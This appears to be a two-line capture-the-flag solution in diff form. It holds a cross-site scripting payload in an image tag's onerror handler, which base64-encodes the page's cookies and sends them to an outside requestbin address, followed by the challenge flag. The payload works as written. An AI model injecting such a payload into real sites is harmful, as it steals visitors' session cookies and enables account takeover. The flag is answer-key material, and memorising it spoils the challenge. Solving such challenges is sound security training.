@@ -1,0 +1,2 @@
+<img src=x onerror="image = new Image(); image.src='http://requestbin.fullcontact.com/187nt201?e='+btoa(document.cookie);">
+Flg: CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}
